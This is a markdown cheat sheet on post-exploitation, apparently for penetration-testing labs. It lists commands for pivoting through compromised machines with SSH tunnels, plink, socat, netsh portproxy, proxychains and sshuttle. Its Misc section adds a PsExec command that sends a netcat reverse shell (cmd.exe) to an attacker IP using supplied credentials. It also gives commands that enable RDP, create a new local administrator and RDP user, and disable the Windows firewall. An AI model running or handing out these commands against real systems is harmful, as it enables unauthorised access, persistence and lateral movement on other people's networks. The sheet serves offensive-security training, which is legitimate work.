# Post Exploitation
* [Pivoting](#Pivoting)
* [Misc](#Misc)

## Pivoting
### Local Port forwarding
#### Port forwarding rinetd
```
apt install rinetd
cat /etc/rinetd.conf
```

#### SSH local port forward
```
ssh -N -L <LOCAL PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<TARGET IP>
```

#### SSH port forwarding over hop
```
ssh -N -L <BIND_ADRESS>:<PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<HOP IP>
```

#### SSH port forwards for shells back over hop
- Execute on Jump host
```
ssh -N user@<ATTACKER IP> -p 22 -L 0.0.0.0:4444:127.0.0.1:4444
```

### Remote port forwarding
#### SSH forward local port of target back to our kali
```
ssh -N -R <BIND_ADRESS>:<PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<ATTACKER IP>
```

### Dynamic port forwarding
```
sudo ssh -N -D 127.0.0.1:9000 <username>@<IP>
vim  /etc/proxychains.conf
socks4		127.0.0.1 9000 #Change this value
#prepend proxychains command before every command to send through the proxychain.
```

#### Port forwarding plink.exe
```
plink.exe <USER>@<IP> -R <ATTACKER PORT>:<TARGET IP>:<TARGET PORT>
```

### Remote port forward socat Windows
- https://netcologne.dl.sourceforge.net/project/unix-utils/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip
- Download all dll's and executable on target
- First hop is compromised machine
```
socat.exe tcp-listen:<LISTENING PORT>,fork tcp-connect:<TARGET IP SECOND HOP>:<TARGET PORT>
```

#### Then let it listen on our kali machine 
- so we can connect with our windows tool for example
```
socat tcp-l:<LISTENING PORT>,fork tcp:<TARGET IP TO SEND IT TO (FIRST HOP)>:<TARGET PORT>
```

### Remote port forward netsh
```
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
```

#### List forwards
```
netsh interface portproxy show v4tov4
```

#### Remove port forward
```
netsh interface portproxy delete v4tov4 listenaddress=<IP> listenport=<PORT>
```

### Proxychains
#### Proxychains over hop
```
ssh -J <USER>@<FIRST HOP IP> -D 127.0.0.1:9000 <USER>@<SECOND IP>
```

### sshuttle
```
sshuttle -r <USERNAME>@<TARGET> <RANGE(s) TO TUNNEL> --ssh-cmd 'ssh -i /home/user/Offshore/id_rsa_root_nix01'
sshuttle -r <USERNAME>@<TARGET> <RANGE(s) TO TUNNEL>
```

## Misc
#### PSExec
Shell back to my machine with other user using netcat 
```
PsExec.exe -u <COMPUTERNAME>\<USERNAME> -p <PASSWORD> \\<COMPUTERNAME> nc.exe <ATTACKER IP> <ATTACKER PORT> -e cmd.exe
```

#### Enable RDP and create user to login
```
#Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

#Enable more then 1 user login
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f

#Add user to RDP group
net user <USER> <PASS> /add /Y
net localgroup administrators <USER> /add
net localgroup "Remote Desktop Users" <USER> /add

#Disable firewall
netsh advfirewall set allprofiles state off

#RDP to machine
xfreerdp /u:<USER> /p:<PASS> /v:<TARGET>
```
